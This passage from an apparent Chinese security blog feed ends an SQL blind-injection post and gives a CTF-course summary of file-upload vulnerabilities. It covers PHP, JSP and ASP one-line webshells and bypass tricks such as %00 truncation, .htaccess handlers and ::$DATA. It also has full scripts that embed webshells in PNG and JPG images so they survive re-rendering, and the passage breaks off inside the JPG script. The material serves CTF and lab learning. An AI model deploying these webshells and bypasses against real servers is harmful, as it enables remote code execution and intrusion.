<p><img src="https://c.img.dasctf.com/images/20221220/1671531672414-7d406572-5897-4a8e-b351-9a813d240474.png" alt="image-20210509120121018"></p>
<p>只有2种回显，永真&amp;永假。</p>
<p>永假:程序报错、查询为空</p>
<p>永真:查询正常，但不返回值</p>
<p>这种可以通过网页上的两种不同的回显的注入，称为布尔盲注。</p>
<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>BP抓包，根据页面响应的时间来判断结果。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞总结</title>
    <url>/2021/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="文件上传姿势总结"><a href="#文件上传姿势总结" class="headerlink" title="文件上传姿势总结"></a>文件上传姿势总结</h1><p>对于近期学习的文件上传的方式进行一个总结。本文除去二次渲染部分，其余部分均为nep联合战队ctf入门课中，firebasky文件上传课程讲解的课件。</p>
<span id="more"></span>
<blockquote>
<p>什么是文件上传？文件上传有什么用。</p>
</blockquote>
<h2 id="文件上传漏洞介绍"><a href="#文件上传漏洞介绍" class="headerlink" title="文件上传漏洞介绍"></a>文件上传漏洞介绍</h2><blockquote>
<p>一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码。</p>
</blockquote>
<p><a href="https://www.w3school.com.cn/php/php_file_upload.asp">文件上传</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>注意form表单里面的enctype属性为二进制数据multipart/form-data</code></p>
<p><strong>注释：允许用户上传文件是一个巨大的安全风险。请仅仅允许可信的用户执行文件上传操作。</strong></p>
<h3 id="php-jsp-asp小马"><a href="#php-jsp-asp小马" class="headerlink" title="php jsp asp小马"></a>php jsp asp小马</h3><blockquote>
<p>相信大家已经听了南浔姐姐讲的web第一节课，了解了一句话木马的相关操</p>
<p>作，我给没赶上上次课的同学再简单说说</p>
</blockquote>
<p><strong>介绍一些</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span> /经典的一句话木马</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;0&quot;</span>));%&gt;</span><br><span class="line">#https://www.jianshu.com/p/123db17b78a0  #jsp木马</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%execute(request(&quot;0&quot;))%&gt;</span><br><span class="line">&#x2F;&#x2F;https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;asp&#x2F;met_execute.asp</span><br><span class="line">&#x2F;&#x2F;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaozi&#x2F;p&#x2F;7560907.html  #asp木马</span><br></pre></td></tr></table></figure>
<p><code>我们将一些危险的代码上传到服务器让其执行就可能危险到服务器的安全</code></p>
<h3 id="菜刀蚁剑介绍"><a href="#菜刀蚁剑介绍" class="headerlink" title="菜刀蚁剑介绍"></a>菜刀蚁剑介绍</h3><p><a href="https://www.fujieace.com/hacker/tools/antsword.html">蚁剑安装</a></p>
<p><a href="https://blog.csdn.net/qq_36235492/article/details/85713821">菜刀蚁剑</a></p>
<h3 id="文件上传如何利用？"><a href="#文件上传如何利用？" class="headerlink" title="文件上传如何利用？"></a>文件上传如何利用？</h3><p>现在我们知道了什么是文件上传和文件上传的危害，那么如何进行利用？</p>
<p>利用条件是什么？</p>
<ul>
<li>能够绕过服务器上传脚本文件(php asp jsp)</li>
<li>知道上传文件的路径和文件名</li>
</ul>
<h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><blockquote>
<p>但是一般的网站都会来验证用户上传的信息，下面介绍一下常见的校验方法和绕过方法。</p>
</blockquote>
<p>实验靶机：<a href="https://github.com/c0ny1/upload-labs">upload-labs</a><a href="https://xz.aliyun.com/t/2435">wp</a></p>
<h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><ul>
<li>javascript校验（一般只校验后缀名）upload-labs 第一关（浏览器 bp都可以）</li>
</ul>
<h4 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h4><ul>
<li><p>content-type验证 upload-labs 第二关</p>
</li>
<li><p>文件扩展名校验  (<code>白名单</code>、<code>黑名单</code>)  upload-labs 第三关</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">白名单:   png jpg gif</span><br><span class="line">黑名单:  (不能上传这些后缀名) php  jsp asp </span><br></pre></td></tr></table></figure>
</li>
<li><p>文件内容头校验（<code>GIF89a</code>）文件幻数检测</p>
</li>
<li><p>文件内容检测 (检测内容是否合法或含有恶意代码   二次渲染配合文件包含<a href="https://xz.aliyun.com/t/2657#toc-3">二次渲染</a></p>
</li>
</ul>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">找漏网之鱼：php3,php4,php7等 (PHP版本&lt;5.3可使用%00截断) </span><br><span class="line">AddType application&#x2F;x-httpd-php .php .php3 .php5 .php7</span><br><span class="line"></span><br><span class="line">大小写绕过：AsP、pHP</span><br><span class="line">文件后缀双写绕过   php &quot;&quot;</span><br><span class="line"></span><br><span class="line">上传不符合windows文件命名规则的文件名 test.php:1.jpg test.php::$DATA 会被windows系统自动去掉不符合规则符号后面的内容</span><br><span class="line">配合解析漏洞绕过</span><br><span class="line"></span><br><span class="line">%00截断 (PHP&lt;5.3.4时 shell.php%00.jpg 可截断%00后的内容) 配合解析漏洞绕过</span><br><span class="line">c语言里面的%00</span><br><span class="line"></span><br><span class="line">.htaccess绕过   (apache)</span><br><span class="line">.user.ini绕过   (nginx)</span><br></pre></td></tr></table></figure>
<h5 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h5><p><code>如upload-labs第四关</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</span><br><span class="line">.htaccess主要的作用有：</span><br><span class="line">URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</span><br></pre></td></tr></table></figure>
<p><strong>php网站在进行解析php的时候会首先解析当前目录下的配置文件</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">1.jpg</span>&quot;&gt;</span>  //匹配文件</span><br><span class="line">        SetHandler application/x-httpd-php  </span><br><span class="line">    //SetHandler方法将1.jpg当成php代码执行</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line">// 作用范围 当前目录</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="内容检测"><a href="#内容检测" class="headerlink" title="内容检测"></a>内容检测</h3><p><code>一般来说是对上传的文件的内容进行一个检测，比如&lt;? ?&gt; php 等等</code></p>
<p>绕过思路是去构造免杀的webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);&lt;/script&gt;<span class="comment">#PHP5 支持</span></span><br></pre></td></tr></table></figure>
<p><strong>实验</strong></p>
<p>ctfshow web168</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;cat ../f*&#x27;</span>);</span><br><span class="line">array_map(<span class="variable">$func</span>, <span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>
<h3 id="FUZZ字典"><a href="#FUZZ字典" class="headerlink" title="FUZZ字典"></a>FUZZ字典</h3><p><strong>fuzz模糊测试</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php3 php4 php5 php6</span><br></pre></td></tr></table></figure>
<p><a href="https://www.freebuf.com/articles/web/188464.html">构造优质上传漏洞Fuzz字典</a></p>
<h3 id="二次渲染的三种姿势"><a href="#二次渲染的三种姿势" class="headerlink" title="二次渲染的三种姿势"></a>二次渲染的三种姿势</h3><p>参考链接：</p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">Upload-Labs第Pass-16通关（二次渲染绕过） 详解</a></p>
<h4 id="GIF绕过姿势"><a href="#GIF绕过姿势" class="headerlink" title="GIF绕过姿势"></a>GIF绕过姿势</h4><p>先用copy命令安排一个图片马：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.gif /b + <span class="built_in">cmd</span>.php /a <span class="built_in">cmd</span>.gif</span><br></pre></td></tr></table></figure>
<p>上传带马的图片，发现没有成功，于是将它下载下来。发现文件名已经变了，且写在gif末端的PHP代码已经被扬了。</p>
<p>对于GIF的二次渲染而言，我们只需要比对渲染前后没有变化的位置即可。在没有变化的部分里面插入一句话木马，即可成功绕过。</p>
<h4 id="PNG绕过姿势"><a href="#PNG绕过姿势" class="headerlink" title="PNG绕过姿势"></a>PNG绕过姿势</h4><p>PNG图片的原理在参考博客中有极为详细的解释与描述，这里就不再赘述。只复现二次渲染的方法。</p>
<p>博客里提到的第一种方法，目前未能复现成功，这种方式只针对索引彩色图像的png图片才有效，在选取png图片时可根据IHDR数据块的color type辨别.03为索引彩色图像。</p>
<p>因此复现第二种方法，通过国外大佬的脚本一键生成。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到的一句话木马为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span><span class="variable">$_GET</span>[<span class="number">0</span>](<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用方式是get传参数0，post传参数1</p>
<p>注意：eval有时候运行不了，需要使用assert</p>
<p><code>?0=assert</code> , <code>1=phpinfo()</code></p>
<h4 id="JPG绕过姿势"><a href="#JPG绕过姿势" class="headerlink" title="JPG绕过姿势"></a>JPG绕过姿势</h4><p>未能复现成功，只写做法。</p>
<p>国外大佬的处理脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span 